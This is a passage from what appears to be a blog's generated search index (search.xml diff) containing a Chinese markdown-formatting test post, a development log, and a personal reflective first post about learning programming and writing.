中间的一句话</p><blockquote><p>嵌套引用</p><blockquote><ul><li>分点样式<br>结束的话</li></ul></blockquote></blockquote></blockquote><pre><code>这个好用        试试   嗯哼</code></pre><p><del>这是被划去的一句话</del><strong>加粗</strong> <em>斜体</em> <em><strong>粗斜体</strong></em></p><p><sub>下标</sub><sup>上标</sup></p><p><ins>下划线</ins> 反引号： <code>npm install </code></p><p><a href="https://www.msn.cn/">链接</a> <a href="https://www.msn.cn/">https://www.msn.cn/</a></p><p><a href="#%E6%A0%87%E9%A2%98">跳转到标题</a></p><p><a href="/about">到about</a><br>跳到about<a href="/about">1</a></p><details><summary>点击展开内容</summary><span style="color: gray; font-size: smaller;">这里是被隐藏的内容。</span></details><p><img src="/img/top.jpg" alt="nice"></p><!-- 这是一条注释，那么差不多我写完了-->]]></content>
+      
+      
+      <categories>
+          
+          <category> 日志 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日志（1）</title>
+      <link href="/2024/12/10/%E5%8D%9A%E5%AE%A2%E6%97%A5%E5%BF%97/"/>
+      <url>/2024/12/10/%E5%8D%9A%E5%AE%A2%E6%97%A5%E5%BF%97/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="更改："><a href="#更改：" class="headerlink" title="更改："></a>更改：</h3></blockquote><p>完成基础页面布置。</p><p>成功发布了第一篇文章。</p><blockquote><h3 id="问题-需求："><a href="#问题-需求：" class="headerlink" title="问题&amp;需求："></a>问题&amp;需求：</h3></blockquote><p>AI窗口打开时页面位移。</p><p>AI输入框输入时按快捷键（i）会被搜索框打断，应该输入时禁用快捷键。</p><p>添加AI的api接口。</p><p>修改主页面。</p><p>添加相册栏。</p><p>添加对访客隐藏的内容。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日志 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 博客 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>第一篇文章</title>
+      <link href="/2024/12/09/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
+      <url>/2024/12/09/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
+      
+        <content type="html"><![CDATA[<p> 虽然，感觉太仓促了，但是……</p><p> 哎，这个自动补全怎么这么烦，我还是用笔记本写吧。</p><p> 但是终于，我要开始写我博客的第一篇文章。</p><details open>  <summary style="display:none;">但是翻源代码肯定不如页面展示舒服吧，我正在寻找一种行之有效的隐藏方法，如果你知道或者有想法也可以私信我</summary>  <p>    折腾来折腾去，真幸运我这么快就布置好了好多东西，大概明白了用法，样式还有些需要更改的地方，之后再去查找这个主题的源代码改改。  </p>  <p>    真是了不起啊，我们能做到这么多不可思议的事，像魔法。  </p>  <p>    我并不是一开始就读的计算机专业，我现在非常庆幸自己的决定，虽然，我还是不喜欢去上课。计算机奇妙的世界并没有解除我现实的困境，但它不断地向我阐明一点：幻想是可以实现的。  </p>  <p>    我想写一部独属于我自己的小说，我想成为顶尖黑客，我想制作一款非常好玩的游戏，我想创造自己专属的数字生命……  </p>  <p>    这怎么可能啊？  </p>  <p>    是啊，这怎么可能啊，一年前这真的仅仅只是我的幻想，一边在脑中演绎一边分泌微量的麻醉精神的多巴胺，可这一年间，我写了一部中篇小说（尽管到处投稿没有人要），我做了第一款单机游戏（还是手机端，可惜没赶上比赛），我在本地部署了一个ai（倒没那么复杂），我开始学习渗透……幻想正不可思议地以现实的姿态飞快地向我靠近。  </p>  <p>    我时常身体阵阵疲惫，而这种不可思议的正反馈正是我激发不可思议的动力的源头，在这种磅礴的欲望面前，我那渺小的世俗欲望显得……莫名其妙。  </p>  <p>    磅礴的欲望，我确实想这么说。  </p>  <p>    在磅礴的欲望下，生命如此伟岸，正是这崇高的、趋近理想的欲望，引导着血液流动，让彷徨的人步履不停，让孤寂的人独行如众，让喧哗的人敛容收声，让孱弱的人恍若神明。  </p>  <p>    人皆愚行，行必踟蹰。我不知何时一个趔趄，倒在脚下泥坑折射的幻境。  </p>  <p>    那么，不妨沉得再深些，沉到欲望深处，去访问挫折与失意裹挟下的生命的真谛。  </p></details><!--<span style="color: gray; font-size:;">以下内容对访客隐藏</span>-->]]></content>
+      
+      
+      <categories>
+          
+          <category> 生活 </category>
+          
+          <category> 记录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 博客 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>叁七的测试博客</title>
+      <link href="/2024/12/09/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
+      <url>/2024/12/09/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
+      
+        <content type="html"><![CDATA[<p>测试内容</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
   
   
 </search>
